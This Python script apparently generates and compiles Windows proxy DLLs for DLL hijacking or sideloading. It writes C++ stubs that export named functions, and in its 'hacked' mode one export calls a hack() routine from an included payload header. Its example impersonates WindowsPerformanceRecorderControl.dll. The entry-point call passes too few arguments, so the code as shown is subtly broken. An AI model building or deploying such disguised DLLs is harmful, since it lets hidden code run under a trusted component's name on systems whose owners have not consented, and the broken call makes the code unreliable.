import os
import shutil
import subprocess
import sys


def gen_code(functions, dll, hack_function="", hack_lib=""):
    dll_name = dll[:-4]
    print(f"[info]: Creating {dll_name}.cpp for dll compiling")
    with open("utils/base.cpp", "r") as f:
        code = f.read()
    if hack_function != "":
        code = f'#include "{os.path.basename(hack_lib)}"\n{code}'
    for function in functions:
        if function == hack_function:
            code += f'extern "C" __declspec(dllexport) VOID _cdecl {function}(void)' + '{ hack();}\n'
        else:
            code += f'extern "C" __declspec(dllexport) VOID _cdecl {function}(void)' + '{ printString("' + function + '");}\n'

    with open(f"temp/{dll_name}.cpp", "w") as f:
        f.write(code)
    return f"temp/{dll_name}.cpp"


def gen_dll(functions, dll, vcvar_bat):
    cpp_path = gen_code(functions, dll)
    os.chdir("temp")
    # ["g++", "-shared", "-o", f"./temp/{dll}", cpp_path, "-O2", "-static-libgcc", "-static-libstdc++"]
    command = [vcvar_bat, "&&", "cl", "/std:c++20", "/EHsc", "/LD", os.path.basename(cpp_path), "/link", f"/OUT:./{dll}"]
    subprocess.run(command)
    print(f"[info]: Compiled new dll to /temp/{dll}")
    os.chdir("../")
    return cpp_path


def gen_hacked_dll(functions, dll, hack_function, hack_lib, vcvar_bat):
    if not os.path.exists("out"):
        os.mkdir("out")

    print(f"[info]: Copying {hack_lib} to /temp/{os.path.basename(hack_lib)}")
    shutil.copy(hack_lib, f"./temp/{os.path.basename(hack_lib)}")
    print(f"[info]: Creating new dll to /out/{dll}")
    cpp_path = gen_code(functions, dll, hack_function, hack_lib)
    os.chdir("temp")
    command = [vcvar_bat, "&&", "cl", "/std:c++20", "/EHsc", "/LD", os.path.basename(cpp_path), "/link", f"/OUT:../out/{dll}"]
    print(f"[info]: Compiling with command: {' '.join(command)}")
    subprocess.run(command, shell=True)
    print(f"[info]: Compiled new dll to /out/{dll}")
    os.chdir("../")
    return cpp_path


def export_out(extra_files, files, template_path):
    for i in range(len(extra_files)):
        extra_files[i] = template_path + extra_files[i]

    extra_files += files
    for file in extra_files:
        shutil.copy(file, f"out/{os.path.basename(file)}")
        print(f"[info]: Exported /out/{os.path.basename(file)}")


if __name__ == "__main__":
    gen_hacked_dll(["WPRCFormatError"], "WindowsPerformanceRecorderControl.dll", "WPRCFormatError", "D:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC\\Auxiliary\\Build\\vcvars64.bat")
